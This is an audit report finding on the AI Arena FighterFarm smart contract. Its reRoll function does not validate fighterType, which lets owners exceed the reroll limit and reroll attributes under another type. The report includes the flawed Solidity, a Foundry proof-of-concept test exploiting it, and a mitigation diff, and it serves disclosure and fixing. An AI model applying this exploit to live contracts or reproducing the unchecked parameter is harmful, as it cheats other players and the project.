[H-04] Since you can reroll with a different fighterType than the NFT you own, you can reroll bypassing maxRerollsAllowed and reroll attributes based on a different fighterType
Submitted byklau5, also found byMcToady, Tychai0s (1,2),vnavascues,d3e4,shaka,alexxander,grearlake,AlexCzm,lanrebayode77,evmboi32,givn,juancito,VAD37,Varun_05,DanielArmstrong,linmiaomiao,14si2o_Flint,Ryonen,n0kto,alexzoid,ktg,denzi_,Aymen0909,Davide,soliditywala,Aamir,sashik_eth,sl1,nuthan2x,0xAsen,merlinboii,ke1caM,Draiakoo,petro_1912,MrPotatoMagic,PoeAudits,0xCiphky,aslanbek,0xvj, cats (1,2),yotov721,btk,pynschon,solmaxis69,fnanni,0xAlix2,0xKowalski,blutorque,t0x1c,ubl4nk,BARW,radin100,Giorgio,zhaojohnson,0xlemon,jesjupyter,SpicyMeatball,novamanbg,xchen1130,matejdb,haxatron,0xAleko,Blank_Space, andSilvermist
Can reroll attributes based on a different fighterType, and can bypass maxRerollsAllowed.
Proof of Concept
maxRerollsAllowedcan be set differently depending on thefighterType. Precisely, it increases as the generation of fighterType increases.
functionincrementGeneration(uint8fighterType)externalreturns(uint8) {require(msg.sender==_ownerAddress);@>generation[fighterType] +=1;@>maxRerollsAllowed[fighterType] +=1;returngeneration[fighterType];}
ThereRollfunction does not verify if thefighterTypegiven as a parameter is actually thefighterTypeof the given tokenId. Therefore, it can use either 0 or 1 regardless of the actual type of the NFT.
This allows bypassingmaxRerollsAllowedfor additional reRoll, and to call_createFighterBaseandcreatePhysicalAttributesbased on a differentfighterTypethan the actual NFT’sfighterType, resulting in attributes calculated based on different criteria.
functionreRoll(uint8tokenId,uint8fighterType)public{require(msg.sender==ownerOf(tokenId));@>require(numRerolls[tokenId] <maxRerollsAllowed[fighterType]);require(_neuronInstance.balanceOf(msg.sender) >=rerollCost,"Not enough NRN for reroll");_neuronInstance.approveSpender(msg.sender,rerollCost);boolsuccess=_neuronInstance.transferFrom(msg.sender,treasuryAddress,rerollCost);if(success) {numRerolls[tokenId] +=1;uint256dna=uint256(keccak256(abi.encode(msg.sender,tokenId,numRerolls[tokenId])));@>      (uint256element,uint256weight,uint256newDna) =_createFighterBase(dna,fighterType);fighters[tokenId].element=element;fighters[tokenId].weight=weight;fighters[tokenId].physicalAttributes=_aiArenaHelperInstance.createPhysicalAttributes(newDna,@>generation[fighterType],fighters[tokenId].iconsType,fighters[tokenId].dendroidBool);_tokenURIs[tokenId] ="";}}
PoC:
First, there is a bug that there is no way to setnumElements, so add a numElements setter to FighterFarm. This bug has been submitted as a separate report.functionnumElementsSetterForPoC(uint8_generation,uint8_newElementNum)public{require(msg.sender==_ownerAddress);require(_newElementNum>0);numElements[_generation] =_newElementNum;}Add a test to the FighterFarm.t.sol file and run it. The generation of Dendroid has increased, andmaxRerollsAllowedhas increased. The user who owns the Champion NFT bypassedmaxRerollsAllowedby putting thefighterTypeof Dendroid as a parameter in thereRollfunction.functiontestPoCRerollBypassMaxRerollsAllowed()public{_mintFromMergingPool(_ownerAddress);// get 4k neuron from treasury_fundUserWith4kNeuronByTreasury(_ownerAddress);// after successfully minting a fighter, update the modelif(_fighterFarmContract.ownerOf(0) ==_ownerAddress) {uint8maxRerolls=_fighterFarmContract.maxRerollsAllowed(0);uint8exceededLimit=maxRerolls+1;uint8tokenId=0;uint8fighterType=0;// The Dendroid's generation changed, and maxRerollsAllowed for Dendroid is increaseduint8fighterType_Dendroid=1;_fighterFarmContract.incrementGeneration(fighterType_Dendroid);assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType_Dendroid),maxRerolls+1);assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType),maxRerolls);// Champions maxRerollsAllowed is not changed_neuronContract.addSpender(address(_fighterFarmContract));_fighterFarmContract.numElementsSetterForPoC(1,3);// this is added function for pocfor(uint8i=0;i<exceededLimit;i++) {if(i== (maxRerolls)) {// reRoll with different fighterTypeassertEq(_fighterFarmContract.numRerolls(tokenId),maxRerolls);_fighterFarmContract.reRoll(tokenId,fighterType_Dendroid);assertEq(_fighterFarmContract.numRerolls(tokenId),exceededLimit);}else{_fighterFarmContract.reRoll(tokenId,fighterType);}}}}
Recommended Mitigation Steps
CheckfighterTypeat reRoll function.
function reRoll(uint8 tokenId, uint8 fighterType) public {require(msg.sender == ownerOf(tokenId));require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");+   require((fighterType == 1 && fighters[tokenId].dendroidBool) || (fighterType == 0 && !fighters[tokenId].dendroidBool), "Wrong fighterType");_neuronInstance.approveSpender(msg.sender, rerollCost);bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);if (success) {numRerolls[tokenId] += 1;uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));(uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);fighters[tokenId].element = element;fighters[tokenId].weight = weight;fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(newDna,generation[fighterType],fighters[tokenId].iconsType,fighters[tokenId].dendroidBool);_tokenURIs[tokenId] = "";}}
raymondfam (lookout) commented:
This report covers three consequences from the same root cause of fighter type validation: 1. more re-rolls, 2. rarer attribute switch, 3. generation attribute switch, with coded POC.
brandinho (AI Arena) confirmed
hickuphh3 (judge) increased severity to High and commented:
Note:issue 212’s fix is a little more elegant.
AI Arena mitigated:
https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/17
Status:Mitigation confirmed. Full details in reports fromniser93,d3e4, andfnanni.